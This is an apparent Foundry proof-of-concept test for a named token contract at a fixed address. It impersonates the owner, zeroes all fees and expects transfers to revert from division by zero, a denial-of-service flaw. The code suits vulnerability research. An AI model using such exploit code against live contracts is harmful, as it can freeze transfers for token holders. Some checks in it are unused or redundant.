pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface SPOOKYHALLOWEENFLOKI {
    function getOwner() external view returns (address);
    function totalFee() external view returns (uint256);
    function setFees_base1000(uint256 _liquidityFee, uint256 _marketingFee, uint256 _teamFee, uint256 _developmentFee, uint256 _burnFee, uint256 _buybackFee) external;
    function tradingStatus(bool _status) external;
    function isFeeExempt(address account) external view returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9f59E79127fAD40bBC26c1eC6578d345AF40bD1f;
    address attacker = address(this);
    address owner;
    address victim = address(0x999);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address from the contract
        owner = SPOOKYHALLOWEENFLOKI(TARGET).getOwner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "SHF Token");

        // We'll need some tokens to test the transfer
        // First, get some tokens from the owner (who has all supply)
        deal(TARGET, attacker, 1000 * 10**9); // Give attacker some tokens

        // Also give tokens to another address for transfer testing
        deal(TARGET, victim, 1000 * 10**9);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Impersonate owner to set fees to zero
        vm.startPrank(owner);
        SPOOKYHALLOWEENFLOKI(TARGET).setFees_base1000(0, 0, 0, 0, 0, 0);
        SPOOKYHALLOWEENFLOKI(TARGET).tradingStatus(true);
        vm.stopPrank();

        // Verify totalFee is now zero
        uint256 totalFeeAfter = SPOOKYHALLOWEENFLOKI(TARGET).totalFee();
        assertEq(totalFeeAfter, 0, "totalFee should be zero");

        // Step 2: Attempt a transfer to trigger division by zero
        // We need to ensure neither sender nor recipient are fee exempt
        // First, check if attacker is fee exempt (shouldn't be by default)
        bool isAttackerFeeExempt = SPOOKYHALLOWEENFLOKI(TARGET).isFeeExempt(attacker);
        bool isVictimFeeExempt = SPOOKYHALLOWEENFLOKI(TARGET).isFeeExempt(victim);

        // If either is fee exempt, we need to use different addresses
        address sender = attacker;
        address recipient = address(0x888); // New address that won't be fee exempt

        // Give sender some tokens if needed
        if (SPOOKYHALLOWEENFLOKI(TARGET).balanceOf(sender) == 0) {
            deal(TARGET, sender, 1000 * 10**9);
        }

        // Approve the contract to spend tokens (for transferFrom)
        vm.prank(sender);
        SPOOKYHALLOWEENFLOKI(TARGET).approve(address(this), 100 * 10**9);

        // Attempt transfer - this should revert with division by zero
        vm.expectRevert();
        SPOOKYHALLOWEENFLOKI(TARGET).transferFrom(sender, recipient, 100 * 10**9);

        // Alternative: direct transfer
        vm.expectRevert();
        vm.prank(sender);
        SPOOKYHALLOWEENFLOKI(TARGET).transfer(recipient, 100 * 10**9);
        assertEq(totalFeeAfter, 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

